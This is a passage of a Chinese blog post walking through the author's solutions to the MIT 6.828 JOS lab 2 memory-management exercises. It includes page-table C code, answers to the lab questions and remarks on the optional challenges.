class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: the TA solution uses pgdir_walk</span></span><br></pre></td></tr></table></figure><p>对应写入页表项条目即可，注意这里不需要改变页的引用计数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">boot_map_region</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="type">uintptr_t</span> va, <span class="type">size_t</span> size, <span class="type">physaddr_t</span> pa, <span class="type">int</span> perm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">pte_t</span> *cur_pte;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size / PGSIZE; i++)</span><br><span class="line">&#123;</span><br><span class="line">cur_pte = pgdir_walk(pgdir, (<span class="type">void</span> *)(va + i * PGSIZE), <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!cur_pte)</span><br><span class="line">panic(<span class="string">&quot;out of memory while creating page table!&quot;</span>);</span><br><span class="line">*cur_pte = (<span class="type">pte_t</span>) ((pa + i * PGSIZE) | PTE_P | perm);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="page-lookup-：返回虚拟地址对应-PageInfo-地址"><a href="#page-lookup-：返回虚拟地址对应-PageInfo-地址" class="headerlink" title="page_lookup()：返回虚拟地址对应 PageInfo 地址"></a>page_lookup()：返回虚拟地址对应 PageInfo 地址</h4><p>主要是让我们查找页表，返回虚拟地址对应的 PageInfo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return the page mapped at virtual address &#x27;va&#x27;.</span></span><br><span class="line"><span class="comment">// If pte_store is not zero, then we store in it the address</span></span><br><span class="line"><span class="comment">// of the pte for this page.  This is used by page_remove and</span></span><br><span class="line"><span class="comment">// can be used to verify page permissions for syscall arguments,</span></span><br><span class="line"><span class="comment">// but should not be used by most callers.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return NULL if there is no page mapped at va.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: the TA solution uses pgdir_walk and pa2page.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>直接用前面写的 <code>pgdir_walk()</code> 找到页表项再用 <code>pa2page()</code> 把物理地址转成 PageInfo 的虚拟地址即可，JOS 还提供了一个方便的页表项到物理地址转化的宏 <code>PTE_ADDR()</code> （一开始笔者都是纯手写…）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> PageInfo *</span><br><span class="line"><span class="title function_">page_lookup</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="type">void</span> *va, <span class="type">pte_t</span> **pte_store)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"></span><br><span class="line"><span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">pte = pgdir_walk(pgdir, va, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pte_store)</span><br><span class="line">*pte_store = pte;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// page not present</span></span><br><span class="line"><span class="keyword">if</span> (!pte || !((*pte) &amp; PTE_P))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pa2page(PTE_ADDR(*pte));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="page-remove-：解除页表虚拟地址映射"><a href="#page-remove-：解除页表虚拟地址映射" class="headerlink" title="page_remove()：解除页表虚拟地址映射"></a>page_remove()：解除页表虚拟地址映射</h4><p>主要是解除页表上对应虚拟地址到物理地址间的映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Unmaps the physical page at virtual address &#x27;va&#x27;.</span></span><br><span class="line"><span class="comment">// If there is no physical page at that address, silently does nothing.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Details:</span></span><br><span class="line"><span class="comment">//   - The ref count on the physical page should decrement.</span></span><br><span class="line"><span class="comment">//   - The physical page should be freed if the refcount reaches 0.</span></span><br><span class="line"><span class="comment">//   - The pg table entry corresponding to &#x27;va&#x27; should be set to 0.</span></span><br><span class="line"><span class="comment">//     (if such a PTE exists)</span></span><br><span class="line"><span class="comment">//   - The TLB must be invalidated if you remove an entry from</span></span><br><span class="line"><span class="comment">//     the page table.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: The TA solution is implemented using page_lookup,</span></span><br><span class="line"><span class="comment">// tlb_invalidate, and page_decref.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>清空页表项并减少引用计数即可，若引用计数为 0 则释放该页，别忘了使用 <code>tlb_invalidate()</code> 清除 TLB 中缓存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_remove</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="type">void</span> *va)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"></span><br><span class="line"><span class="type">pte_t</span> *pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// get the PageInfo and PTE</span></span><br><span class="line">pp = page_lookup(pgdir, va, &amp;pte);</span><br><span class="line"><span class="keyword">if</span> (pp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// clear PTE</span></span><br><span class="line">tlb_invalidate(pgdir, va);</span><br><span class="line">*pte = (<span class="type">pte_t</span>) <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decrease refcount</span></span><br><span class="line">page_decref(pp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="page-insert-：建立虚拟地址到物理页映射"><a href="#page-insert-：建立虚拟地址到物理页映射" class="headerlink" title="page_insert()：建立虚拟地址到物理页映射"></a>page_insert()：建立虚拟地址到物理页映射</h4><p>建立单个虚拟地址到单张物理页上的映射，分配并增加页引用计数，若已有一个映射则移除现有映射并清空 TLB 对应条目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Map the physical page &#x27;pp&#x27; at virtual address &#x27;va&#x27;.</span></span><br><span class="line"><span class="comment">// The permissions (the low 12 bits) of the page table entry</span></span><br><span class="line"><span class="comment">// should be set to &#x27;perm|PTE_P&#x27;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Requirements</span></span><br><span class="line"><span class="comment">//   - If there is already a page mapped at &#x27;va&#x27;, it should be page_remove()d.</span></span><br><span class="line"><span class="comment">//   - If necessary, on demand, a page table should be allocated and inserted</span></span><br><span class="line"><span class="comment">//     into &#x27;pgdir&#x27;.</span></span><br><span class="line"><span class="comment">//   - pp-&gt;pp_ref should be incremented if the insertion succeeds.</span></span><br><span class="line"><span class="comment">//   - The TLB must be invalidated if a page was formerly present at &#x27;va&#x27;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Corner-case hint: Make sure to consider what happens when the same</span></span><br><span class="line"><span class="comment">// pp is re-inserted at the same virtual address in the same pgdir.</span></span><br><span class="line"><span class="comment">// However, try not to distinguish this case in your code, as this</span></span><br><span class="line"><span class="comment">// frequently leads to subtle bugs; there&#x27;s an elegant way to handle</span></span><br><span class="line"><span class="comment">// everything in one code path.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// RETURNS:</span></span><br><span class="line"><span class="comment">//   0 on success</span></span><br><span class="line"><span class="comment">//   -E_NO_MEM, if page table couldn&#x27;t be allocated</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: The TA solution is implemented using pgdir_walk, page_remove,</span></span><br><span class="line"><span class="comment">// and page2pa.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>官方推荐用 <code>page_remove()</code> 完成对现有页的解引用，但是会重复调用 <code>pgdir_walk()</code>，所以笔者直接展开操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">page_insert</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="keyword">struct</span> PageInfo *pp, <span class="type">void</span> *va, <span class="type">int</span> perm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="type">pte_t</span> *pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">old_pp</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// get pte of va, create it if not exist</span></span><br><span class="line">pte = pgdir_walk(pgdir, va, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!pte)</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">// page already present, dereference it</span></span><br><span class="line"><span class="keyword">if</span> ((*pte) &amp; PTE_P)</span><br><span class="line">&#123;</span><br><span class="line">old_pp = pa2page(PTE_ADDR(*pte));</span><br><span class="line"></span><br><span class="line"><span class="comment">// if insert the same, just set the perm and return</span></span><br><span class="line"><span class="keyword">if</span> (old_pp == pp)</span><br><span class="line">&#123;</span><br><span class="line">*pte = page2pa(pp) | perm | PTE_P;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// clear PTE</span></span><br><span class="line">tlb_invalidate(pgdir, va);</span><br><span class="line">*pte = (<span class="type">pte_t</span>) <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decrease refcount</span></span><br><span class="line">page_decref(old_pp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pp-&gt;pp_ref++;</span><br><span class="line">*pte = page2pa(pp) | perm | PTE_P;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里时运行 lab2 的分数检查程序应该有 40 分了</p><h2 id="Part-3-Kernel-Address-Space"><a href="#Part-3-Kernel-Address-Space" class="headerlink" title="Part 3: Kernel Address Space"></a>Part 3: Kernel Address Space</h2><p>kernel 占据高 256MB的虚拟地址空间而 user 使用剩余的虚拟地址空间</p><h3 id="Permissions-and-Fault-Isolation"><a href="#Permissions-and-Fault-Isolation" class="headerlink" title="Permissions and Fault Isolation"></a>Permissions and Fault Isolation</h3><p>因为一张页目录表同时映射了用户空间与内核空间，因此我们需要通过页表中的权限位限制用户对一些地址空间的访问：</p><ul><li>对于 <code>ULIM</code> 往高地址的内存，用户无权访问</li><li>对于 <code>[UTOP, ULIM)</code> 这块区域的内存，用户与内核都<strong>只有只读权限</strong>，这块区域的映射将页表、PageInfo 数组等结构暴露给用户，但只有位于内核空间的映射可以写入页表与 PageInfo 数组</li></ul><h3 id="Initializing-the-Kernel-Address-Space"><a href="#Initializing-the-Kernel-Address-Space" class="headerlink" title="Initializing the Kernel Address Space"></a>Initializing the Kernel Address Space</h3><p>接下来是 Exercise 5：完成 <code>mem_init()</code> 的剩余部分</p><blockquote><p><strong>Exercise 5.</strong> Fill in the missing code in <code>mem_init()</code> after the call to <code>check_page()</code>.</p><p>Your code should now pass the <code>check_kern_pgdir()</code> and <code>check_page_installed_pgdir()</code> checks.</p></blockquote><h4 id="mem-init-：（part2）"><a href="#mem-init-：（part2）" class="headerlink" title="mem_init()：（part2）"></a>mem_init()：（part2）</h4><p>目光放回 <code>mem_init()</code>，接下来又到了该我们补全的地方：将 pages 映射到线性地址 <code>UPAGES</code> 上，新建映射的权限应为用户与内核都可读，但 pages 结构体应当为内核可读写而用户不可知，因此应当建立新的映射，这里该用上我们之前写的 <code>boot_map_region()</code> 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Now we set up virtual memory</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Map &#x27;pages&#x27; read-only by the user at linear address UPAGES</span></span><br><span class="line"><span class="comment">// Permissions:</span></span><br><span class="line"><span class="comment">//    - the new image at UPAGES -- kernel R, user R</span></span><br><span class="line"><span class="comment">//      (ie. perm = PTE_U | PTE_P)</span></span><br><span class="line"><span class="comment">//    - pages itself -- kernel RW, user NONE</span></span><br><span class="line"><span class="comment">// Your code goes here:</span></span><br><span class="line">boot_map_region(kern_pgdir, UPAGES, </span><br><span class="line">ROUNDUP(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo) * npages, PGSIZE), PADDR(pages), </span><br><span class="line">PTE_U);</span><br></pre></td></tr></table></figure><p>然后到初始化内核栈了，这里内核栈被分为两块：</p><ul><li>常规的可读写内核栈</li><li>内核栈保护页面，读写到该页面上时说明栈爆了，称为 guard page</li></ul><p>guard page 不需要我们建立新的映射，因为如果爆栈了读写到 guard page 自然会触发 page fault，这时我们便知道爆栈了</p><p>需要注意内核栈应仅为内核可读写，应设置页表项的 Supervisor 权限位，即不使用 <code>PTE_U</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Use the physical memory that &#x27;bootstack&#x27; refers to as the kernel</span></span><br><span class="line"><span class="comment">// stack.  The kernel stack grows down from virtual address KSTACKTOP.</span></span><br><span class="line"><span class="comment">// We consider the entire range from [KSTACKTOP-PTSIZE, KSTACKTOP)</span></span><br><span class="line"><span class="comment">// to be the kernel stack, but break this into two pieces:</span></span><br><span class="line"><span class="comment">//     * [KSTACKTOP-KSTKSIZE, KSTACKTOP) -- backed by physical memory</span></span><br><span class="line"><span class="comment">//     * [KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE) -- not backed; so if</span></span><br><span class="line"><span class="comment">//       the kernel overflows its stack, it will fault rather than</span></span><br><span class="line"><span class="comment">//       overwrite memory.  Known as a &quot;guard page&quot;.</span></span><br><span class="line"><span class="comment">//     Permissions: kernel RW, user NONE</span></span><br><span class="line"><span class="comment">// Your code goes here:</span></span><br><span class="line">boot_map_region(kern_pgdir, KSTACKTOP - KSTKSIZE, KSTKSIZE, </span><br><span class="line">PADDR(bootstack), PTE_W);</span><br></pre></td></tr></table></figure><p>最后是建立内核空间的映射，将高虚拟地址处的内核映射到物理地址起始处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Map all of physical memory at KERNBASE.</span></span><br><span class="line"><span class="comment">// Ie.  the VA range [KERNBASE, 2^32) should map to</span></span><br><span class="line"><span class="comment">//      the PA range [0, 2^32 - KERNBASE)</span></span><br><span class="line"><span class="comment">// We might not have 2^32 - KERNBASE bytes of physical memory, but</span></span><br><span class="line"><span class="comment">// we just set up the mapping anyway.</span></span><br><span class="line"><span class="comment">// Permissions: kernel RW, user NONE</span></span><br><span class="line"><span class="comment">// Your code goes here:</span></span><br><span class="line">boot_map_region(kern_pgdir, KERNBASE,</span><br><span class="line">ROUNDUP(<span class="number">0xffffffff</span> - KERNBASE, PGSIZE), </span><br><span class="line"><span class="number">0</span>, PTE_W);</span><br></pre></td></tr></table></figure><p>完成这一切之后运行分数判断程序，全部通过，至此，lab2 的所有编程练习完美通过</p><p><img src="https://s2.loli.net/2022/03/15/IGJUqd92siweVzg.png" alt="image.png"></p><p>下面是习题 Time</p><blockquote><p><strong>Question</strong></p><ol><li><p>What entries (rows) in the page directory have been filled in at this point? What addresses do they map and where do they point? In other words, fill out this table as much as possible:</p><table><thead><tr><th>Entry</th><th>Base Virtual Address</th><th>Points to (logically):</th></tr></thead><tbody><tr><td>1023</td><td>?</td><td>Page table for top 4MB of phys memory</td></tr><tr><td>1022</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>.</td><td>?</td><td>?</td></tr><tr><td>2</td><td>0x00800000</td><td>?</td></tr><tr><td>1</td><td>0x00400000</td><td>?</td></tr><tr><td>0</td><td>0x00000000</td><td>[see next question]</td></tr></tbody></table><p><del>破题🐕都不做</del></p></li><li><p>We have placed the kernel and user environment in the same address space. Why will user programs not be able to read or write the kernel’s memory? What specific mechanisms protect the kernel memory?</p><p>由于页表项相关权限位的存在，导致用户进程（运行在 ring3）无法读写内核的内存空间，内存分页机制保护了内核内存</p></li><li><p>What is the maximum amount of physical memory that this operating system can support? Why?</p><p>操作系统最大可支持的物理内存应当为 4GB，这是一个 32 位长度的地址能够表示的范围上限</p></li><li><p>How much space overhead is there for managing memory, if we actually had the maximum amount of physical memory? How is this overhead broken down?</p><p><del>看不懂题目，摸了！</del>对于页表结构而言，一个二级页表刚好能满载 4GB 空间，需要一张页目录表与 1024 张页表，总计 <code>4198400</code> 字节空间；对于 PageInfo 结构体数组而言，一个 PageInfo 结构体占用的空间为 8 字节（4 字节对齐），那么要管理 4GB 的空间总计需要 <code>1048576</code> 个 PageInfo 结构体，占据 <code>8388608</code> 字节的空间；两者总计消耗 0.29% 的内存空间，笔者认为这个开销还是挺小的</p></li><li><p>Revisit the page table setup in <code>kern/entry.S</code> and <code>kern/entrypgdir.c</code>. Immediately after we turn on paging, EIP is still a low number (a little over 1MB). At what point do we transition to running at an EIP above KERNBASE? What makes it possible for us to continue executing at a low EIP between when we enable paging and when we begin running at an EIP above KERNBASE? Why is this transition necessary?</p><p>因为在启用分页之后低 1MB 的线性空间仍然映射到低 1MB 的物理空间，因此此时仍能正常运行；在 <code>call i386_init</code> 时跳转到 <code>kern/init.c</code> 中的 <code>i386_init()</code> 函数，此时 eip 便位于内核虚拟地址空间中了；在页表中建立双重映射；因为在开启分页之后 eip 暂时还运行在低地址空间，因此要先有个临时的双重映射保证进入内核虚拟地址空间之前的正常运行</p></li></ol></blockquote><p>接下来是选做部分：MIT 6.828 的 Challenge</p><blockquote><p><em>Challenge!</em> We consumed many physical pages to hold the page tables for the KERNBASE mapping. Do a more space-efficient job using the PTE_PS (“Page Size”) bit in the page directory entries. This bit was <em>not</em> supported in the original 80386, but is supported on more recent x86 processors. You will therefore have to refer to <a href="https://pdos.csail.mit.edu/6.828/2018/readings/ia32/IA32-3A.pdf">Volume 3 of the current Intel manuals</a>. Make sure you design the kernel to use this optimization only on processors that support it!</p></blockquote><p>这个 challenge 的意思大概就是开启 4MB 的大页，这首先需要我们修改 Cr4 寄存器，设置 <strong>Page-Size Extensions</strong> 标志位为 1 后内存页的大小就从 4KB 变成了 4MB，还需要设置页表项的 <code>PTE_PS</code> 位，主要都是苦力活这里就先摸了（</p><p>下一个 Challenge，新增一个 <code>showmappings</code> 命令：</p><blockquote><p><em>Challenge!</em> Extend the JOS kernel monitor with commands to:</p><ul><li>Display in a useful and easy-to-read format all of the physical page mappings (or lack thereof) that apply to a particular range of virtual&#x2F;linear addresses in the currently active address space. For example, you might enter <code>&#39;showmappings 0x3000 0x5000&#39;</code> to display the physical page mappings and corresponding permission bits that apply to the pages at virtual addresses 0x3000, 0x4000, and 0x5000.</li><li>Explicitly set, clear, or change the permissions of any mapping in the current address space.</li><li>Dump the contents of a range of memory given either a virtual or physical address range. Be sure the dump code behaves correctly when the range extends across page boundaries!</li><li>Do anything else that you think might be useful later for debugging the kernel. (There’s a good chance it will be!)</li></ul></blockquote><p>使用 strtol 将字符串转为数字后使用 <code>page_lookup()</code> 查阅页表后打印即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_show_mapping</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uintptr_t</span> vstart, vend;</span><br><span class="line"><span class="type">pte_t</span>*pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">cprintf(<span class="string">&quot;Usage: showmappings addr_start addr_end\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vstart = strtol(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">vend = strtol(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (vstart &gt; vend)</span><br><span class="line">&#123;</span><br><span class="line">cprintf(<span class="string">&quot;Invalid start or end address!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cprintf(<span class="string">&quot;Virtual address\t\tPhysical Address\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (; vstart &lt;= vend; vstart += PGSIZE)</span><br><span class="line">&#123;</span><br><span class="line">cprintf(<span class="string">&quot;  %010p\t\t &quot;</span>, vstart);</span><br><span class="line">pp = page_lookup(kern_pgdir, (<span class="type">void</span>*) vstart, &amp;pte);</span><br><span class="line"><span class="keyword">if</span> (!pte)</span><br><span class="line">cprintf(<span class="string">&quot; Not mapped yet.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cprintf(<span class="string">&quot;  %010p\n&quot;</span>, page2pa(pp));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下所示</p><p><img src="https://s2.loli.net/2022/03/16/Zz7vt2aeMJlUGVD.png" alt="image.png"></p><h3 id="Address-Space-Layout-Alternatives"><a href="#Address-Space-Layout-Alternatives" class="headerlink" title="Address Space Layout Alternatives"></a>Address Space Layout Alternatives</h3><p>当前的 JOS 内存布局并非是唯一的一种，一个操作系统还能将内核映射在线性低地址空间、而将线性高地址空间给用户进程使用，但由于 x86的一种向后兼容模式——虚拟 8086 模式将处理器“硬连线”到线性地址空间底部，因此若内核映射到此处则完全不可用</p><p>虽然这可能比想象中困难，但我们仍然有能将内核映射到低线性地址空间的方案——允许用户进程直接访问整个地址空间，但仍将内核与各进程间分割开来</p><blockquote><p>笔者评价：闲得慌</p></blockquote><p>下面是三个<del>闲得慌</del>的 Challenge：</p><blockquote><p><em>Challenge!</em> Each user-level environment maps the kernel. Change JOS so that the kernel has its own page table and so that a user-level environment runs with a minimal number of kernel pages mapped. That is, each user-level environment maps just enough pages mapped so that the user-level environment can enter and leave the kernel correctly. You also have to come up with a plan for the kernel to read&#x2F;write arguments to system calls.</p></blockquote><p>大概是给内核设置一个独立的页表，而<strong>用户进程仅保留必须用到的内核映射，例如内核入口点</strong>（比如说系统调用），笔者认为这个实现差不多是 KPTI 的思想，这里就不手抄一份 KPTI 了<del>，用户进程还啥影子都没有，写个🐓</del></p><blockquote><p><em>Challenge!</em> Write up an outline of how a kernel could be designed to allow user environments unrestricted use of the full 4GB virtual and linear address space. Hint: do the previous challenge exercise first, which reduces the kernel to a few mappings in a user environment. Hint: the technique is sometimes known as “<em>follow the bouncing kernel</em>.” In your design, be sure to address exactly what has to happen when the processor transitions between kernel and user modes, and how the kernel would accomplish such transitions. Also describe how the kernel would access physical memory and I&#x2F;O devices in this scheme, and how the kernel would access a user environment’s virtual address space during system calls and the like. Finally, think about and describe the advantages and disadvantages of such a scheme in terms of flexibility, performance, kernel complexity, and other factors you can think of.</p></blockquote><p>大概是设计与实现上面的方案，并确保自己明确其中的细节</p><blockquote><p><em>Challenge!</em> Since our JOS kernel’s memory management system only allocates and frees memory on page granularity, we do not have anything comparable to a general-purpose <code>malloc</code>&#x2F;<code>free</code> facility that we can use within the kernel. This could be a problem if we want to support certain types of I&#x2F;O devices that require <em>physically contiguous</em> buffers larger than 4KB in size, or if we want user-level environments, and not just the kernel, to be able to allocate and map 4MB <em>superpages</em> for maximum processor efficiency. (See the earlier 